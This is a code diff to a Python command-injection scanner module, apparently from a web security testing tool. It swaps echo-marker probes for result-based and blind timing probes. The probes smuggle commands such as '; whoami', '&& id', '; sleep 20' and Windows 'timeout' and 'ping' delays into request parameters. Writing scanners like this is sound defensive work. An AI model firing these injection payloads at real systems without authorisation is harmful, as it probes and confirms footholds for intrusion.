@@ -1,25 +1,28 @@
-import random
 import re
-import string
-from typing import Dict, Any, List, Tuple, Optional
+import time
+from typing import List, Dict, Any, Tuple, Optional
 
 from core.http import HTTPClient
 from core.targets import Target
 
 
 # ============================================================
-# Helpers
+# Config
 # ============================================================
 
-def _rand_token(n: int = 8) -> str:
-    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))
+BLIND_SLEEP = 20
+# How much of the sleep we require to consider it "real" (handles jitter).
+# Example: 20s sleep => require >= 12s extra delay over baseline.
+BLIND_DIFF_RATIO = 0.60
+BASELINE_SAMPLES = 3
+TIMEOUT_BUFFER = 12  # seconds added to client timeout for blind probes
 
 
-def _rand_marker() -> str:
-    return "toasti_os_" + _rand_token(10)
+# ============================================================
+# Request helpers
+# ============================================================
 
-
-def _send_target(client: HTTPClient, t: Target, values: Dict[str, str]) -> Tuple[int, str, float, str]:
+def _send(client: HTTPClient, t: Target, values: Dict[str, str]) -> Tuple[int, str, float, str]:
     method = (t.method or "GET").upper().strip()
 
     payload: Dict[str, Any] = {}
@@ -35,133 +38,163 @@ def _send_target(client: HTTPClient, t: Target, values: Dict[str, str]) -> Tuple
     return client.request(method, t.url, data=payload)
 
 
-_PRE_RE = re.compile(r"<pre[^>]*>(.*?)</pre>", re.IGNORECASE | re.DOTALL)
-
-
-def _extract_pre_text(html: str) -> Optional[str]:
+def _timed_send(client: HTTPClient, t: Target, values: Dict[str, str]) -> Tuple[int, str, float, str]:
     """
-    If the page uses engine.html style output, command output is inside <pre>...</pre>.
-    We ONLY trust this region to avoid reflection false positives elsewhere in the HTML.
+    Measure elapsed time ourselves (in addition to whatever HTTPClient returns),
+    so blind detection is robust.
     """
-    if not html:
-        return None
-    m = _PRE_RE.search(html)
-    if not m:
-        return None
-    # Keep it simple: return raw inner text (may include HTML entities, that's fine for marker matching)
-    return m.group(1)
-
-
-def _baseline_region(b_body: str) -> str:
-    """
-    Region used for baseline comparison. Prefer <pre> if present, else whole body.
-    """
-    pre = _extract_pre_text(b_body or "")
-    return pre if pre is not None else (b_body or "")
-
-
-def _response_region(s_body: str) -> str:
-    """
-    Region used for detection. Prefer <pre> if present, else whole body.
-    """
-    pre = _extract_pre_text(s_body or "")
-    return pre if pre is not None else (s_body or "")
-
-
-def _detect_exec(region: str, baseline_region: str, marker: str, payload: str) -> bool:
-    """
-    Robust execution detection to avoid reflection false positives.
-
-    We require:
-      - marker appears in the output region
-      - marker did NOT appear in baseline region
-      - the literal injection string ('echo <marker>') does NOT appear in output region
-      - the full payload does NOT appear verbatim in output region
-
-    Why:
-      Reflection often prints the payload itself. Real command output prints only the marker.
-    """
-    if not region:
-        return False
-
-    if marker not in region:
-        return False
-
-    if baseline_region and marker in baseline_region:
-        return False
-
-    # If output region contains the literal injected command, it's likely just reflection / debug
-    # (In real command output, you'll see the marker, not "echo toasti_os_xxx")
-    if f"echo {marker}".lower() in region.lower():
-        return False
-
-    # If the output region contains the exact payload, also likely reflection
-    if payload and payload in region:
-        return False
-
-    return True
+    start = time.perf_counter()
+    status, body, _, final_url = _send(client, t, values)
+    elapsed = time.perf_counter() - start
+    return status, body, elapsed, final_url
 
 
 # ============================================================
-# Cross-platform probes (safe, marker-based)
+# Output extraction (only for results-based detection)
 # ============================================================
 
-def _make_probes(marker: str) -> List[Dict[str, str]]:
-    """
-    We always include both Windows and Linux-style separators.
-    If ANY works, we flag vulnerable and record which family succeeded.
+OUTPUT_RE = re.compile(r"Output:\s*(.*)", re.I | re.S)
+PRE_RE = re.compile(r"<pre[^>]*>(.*?)</pre>", re.I | re.S)
 
-    We use echo because it's common on Windows and Linux, and it produces deterministic output.
+
+def _extract_output(body: str) -> str:
     """
+    Prefer Output: region (NetTools-like), else <pre> (your lab).
+    This prevents SSTI fields / reflected input from causing OS false positives.
+    """
+    if not body:
+        return ""
+
+    m = OUTPUT_RE.search(body)
+    if m:
+        return m.group(1)
+
+    p = PRE_RE.search(body)
+    if p:
+        return p.group(1)
+
+    # If neither exists, we return empty string rather than whole HTML,
+    # to avoid reflection-based false positives.
+    return ""
+
+
+# ============================================================
+# Results-based OS injection detection (keeps your current method)
+# ============================================================
+
+# Windows whoami often looks like DESKTOP\user, domain\user, etc.
+WHOAMI_WIN_RE = re.compile(r"^[A-Za-z0-9._-]+\\[A-Za-z0-9._-]+$", re.M)
+# Linux/mac whoami often a simple username
+WHOAMI_NIX_RE = re.compile(r"^[a-z_][a-z0-9_-]{0,31}$", re.M | re.I)
+# id output contains uid=...
+ID_RE = re.compile(r"uid=\d+", re.M)
+
+
+def _detect_results(output: str, baseline: str) -> bool:
+    if not output:
+        return False
+
+    # Must differ from baseline (baseline usually empty for these labs)
+    if baseline and output == baseline:
+        return False
+
+    # Strong signals:
+    if ID_RE.search(output) and not ID_RE.search(baseline or ""):
+        return True
+
+    if WHOAMI_WIN_RE.search(output) and not WHOAMI_WIN_RE.search(baseline or ""):
+        return True
+
+    if WHOAMI_NIX_RE.search(output) and not WHOAMI_NIX_RE.search(baseline or ""):
+        return True
+
+    return False
+
+
+def _result_probes() -> List[Dict[str, str]]:
     base = "127.0.0.1"
-
-    probes: List[Dict[str, str]] = []
-
-    # Windows-style chaining
-    probes.append({
-        "type": "win_amp",
-        "platform": "windows",
-        "payload": f"{base} & echo {marker}",
-        "expected_marker": marker,
-    })
-    probes.append({
-        "type": "win_and",
-        "platform": "windows",
-        "payload": f"{base} && echo {marker}",
-        "expected_marker": marker,
-    })
-    probes.append({
-        "type": "win_pipe",
-        "platform": "windows",
-        "payload": f"{base} | echo {marker}",
-        "expected_marker": marker,
-    })
-
-    # Linux/macOS-style chaining
-    probes.append({
-        "type": "lin_semicolon",
-        "platform": "linux",
-        "payload": f"{base}; echo {marker}",
-        "expected_marker": marker,
-    })
-    probes.append({
-        "type": "lin_and",
-        "platform": "linux",
-        "payload": f"{base} && echo {marker}",
-        "expected_marker": marker,
-    })
-    probes.append({
-        "type": "lin_pipe",
-        "platform": "linux",
-        "payload": f"{base} | echo {marker}",
-        "expected_marker": marker,
-    })
-
-    return probes
+    return [
+        {"type": "whoami_semicolon", "payload": f"{base}; whoami"},
+        {"type": "whoami_andand",    "payload": f"{base} && whoami"},
+        {"type": "whoami_amp",       "payload": f"{base} & whoami"},
+        {"type": "id_semicolon",     "payload": f"{base}; id"},
+        {"type": "id_andand",        "payload": f"{base} && id"},
+        {"type": "id_amp",           "payload": f"{base} & id"},
+    ]
 
 
 # ============================================================
-# Main scan
+# Blind time-based OS injection detection
+# ============================================================
+
+def _blind_probes() -> List[Dict[str, str]]:
+    base = "127.0.0.1"
+    s = BLIND_SLEEP
+    return [
+        # Linux/mac
+        {"type": "sleep_semicolon", "payload": f"{base}; sleep {s}"},
+        {"type": "sleep_andand",    "payload": f"{base} && sleep {s}"},
+        # Windows timeout (built-in)
+        {"type": "timeout_amp",     "payload": f"{base} & timeout /T {s} /NOBREAK"},
+        {"type": "timeout_andand",  "payload": f"{base} && timeout /T {s} /NOBREAK"},
+        # Windows ping delay fallback
+        {"type": "ping_amp",        "payload": f"{base} & ping -n {s+1} 127.0.0.1"},
+    ]
+
+
+def _measure_baseline(client: HTTPClient, t: Target) -> Optional[float]:
+    times: List[float] = []
+    for _ in range(BASELINE_SAMPLES):
+        try:
+            _, _, elapsed, _ = _timed_send(client, t, {})
+            times.append(elapsed)
+        except Exception:
+            continue
+
+    if not times:
+        return None
+    return sum(times) / len(times)
+
+
+def _detect_blind(client: HTTPClient, t: Target, param: str) -> Tuple[bool, int, Optional[float]]:
+    """
+    Blind detection is ONLY timing-based.
+    We temporarily increase client.timeout so 20s sleeps don't get cut off at 15s.
+    """
+    original_timeout = getattr(client, "timeout", 15)
+    needed_timeout = max(original_timeout, BLIND_SLEEP + TIMEOUT_BUFFER)
+
+    # Temporarily increase
+    client.timeout = needed_timeout
+
+    try:
+        baseline = _measure_baseline(client, t)
+        if baseline is None:
+            return False, 0, None
+
+        threshold = baseline + (BLIND_SLEEP * BLIND_DIFF_RATIO)
+        pass_count = 0
+
+        for pr in _blind_probes():
+            payload = pr["payload"]
+            try:
+                _, _, elapsed, _ = _timed_send(client, t, {param: payload})
+            except Exception:
+                # If request errors/timeouts, just treat as not proven
+                continue
+
+            if elapsed >= threshold:
+                pass_count += 1
+
+        return pass_count > 0, pass_count, baseline
+
+    finally:
+        # Restore original timeout so we don't affect other engines / crawling
+        client.timeout = original_timeout
+
+
+# ============================================================
+# Main scan entry
 # ============================================================
 
 def os_injection_scan(client: HTTPClient, targets: List[Target]) -> List[Dict[str, Any]]:
@@ -172,87 +205,88 @@ def os_injection_scan(client: HTTPClient, targets: List[Target]) -> List[Dict[st
         if not params:
             continue
 
-        # baseline
+        # Baseline body for output-based comparison (results-based only)
         try:
-            b_status, b_body, _, b_url = _send_target(client, t, {})
+            b_status, b_body, _, b_url = _send(client, t, {})
         except Exception:
             continue
 
-        baseline_region = _baseline_region(b_body or "")
+        baseline_output = _extract_output(b_body or "")
 
         for p in params:
-            marker = _rand_marker()
-            probes = _make_probes(marker)
+            # ----------------------------
+            # 1) Results-based detection
+            # ----------------------------
+            result_pass = 0
+            result_probe_results: List[Dict[str, Any]] = []
 
-            probe_results: List[Dict[str, Any]] = []
-            pass_count = 0
-            detected_platforms = set()
-
-            for pr in probes:
+            for pr in _result_probes():
                 payload = pr["payload"]
-                platform = pr["platform"]
-                ptype = pr["type"]
-
                 try:
-                    s_status, s_body, _, s_url = _send_target(client, t, {p: payload})
+                    s_status, s_body, _, s_url = _send(client, t, {p: payload})
                 except Exception:
-                    probe_results.append({
-                        "type": ptype,
-                        "platform": platform,
+                    result_probe_results.append({
+                        "type": pr["type"],
                         "payload": payload,
-                        "marker_present": False,
-                        "exec_present": False,
                         "status": 0,
                         "final_url": t.url,
+                        "exec_present": False,
                         "error": "probe_request_failed",
                     })
                     continue
 
-                region = _response_region(s_body or "")
-
-                exec_present = _detect_exec(
-                    region=region,
-                    baseline_region=baseline_region,
-                    marker=marker,
-                    payload=payload
-                )
+                out = _extract_output(s_body or "")
+                exec_present = _detect_results(out, baseline_output)
 
                 if exec_present:
-                    pass_count += 1
-                    detected_platforms.add(platform)
+                    result_pass += 1
 
-                probe_results.append({
-                    "type": ptype,
-                    "platform": platform,
+                result_probe_results.append({
+                    "type": pr["type"],
                     "payload": payload,
-                    "marker_present": (marker in region),
-                    "exec_present": exec_present,
                     "status": s_status,
                     "final_url": s_url,
+                    "exec_present": exec_present,
                 })
 
-            # Confidence scoring (simple, stable)
-            confidence = 0
-            if pass_count >= 1:
-                confidence = 80
-            if pass_count >= 2:
-                confidence = 90
-            if pass_count >= 3:
-                confidence = 100
+            if result_pass > 0:
+                results.append({
+                    "target": t.to_dict(),
+                    "param": p,
+                    "baseline": {"status": b_status, "final_url": b_url, "len": len(b_body or "")},
+                    "os_probes": result_probe_results,
+                    "verdict": {
+                        "vulnerable": True,
+                        "confidence": min(100, 60 + result_pass * 10),
+                        "method": "results-based",
+                        "result_pass": result_pass,
+                        "blind_pass": 0,
+                    },
+                })
+                continue
 
-            vulnerable = (pass_count >= 1)
+            # ----------------------------
+            # 2) Blind time-based detection
+            # ----------------------------
+            blind_vuln, blind_pass, baseline_time = _detect_blind(client, t, p)
 
             results.append({
                 "target": t.to_dict(),
                 "param": p,
-                "baseline": {"status": b_status, "final_url": b_url, "len": len(b_body or "")},
-                "os_probes": probe_results,
+                "baseline": {
+                    "status": b_status,
+                    "final_url": b_url,
+                    "len": len(b_body or ""),
+                    "baseline_time_s": baseline_time,
+                },
+                "os_probes": result_probe_results,  # keep the probes list for consistency
                 "verdict": {
-                    "vulnerable": vulnerable,
-                    "confidence": confidence,
-                    "pass_count": pass_count,
-                    "probe_count": len(probes),
-                    "detected_platforms": list(detected_platforms),
+                    "vulnerable": bool(blind_vuln),
+                    "confidence": 90 if blind_vuln else 0,
+                    "method": "blind-time-based" if blind_vuln else "none",
+                    "result_pass": 0,
+                    "blind_pass": blind_pass,
+                    "sleep_s": BLIND_SLEEP,
                 },
             })
 
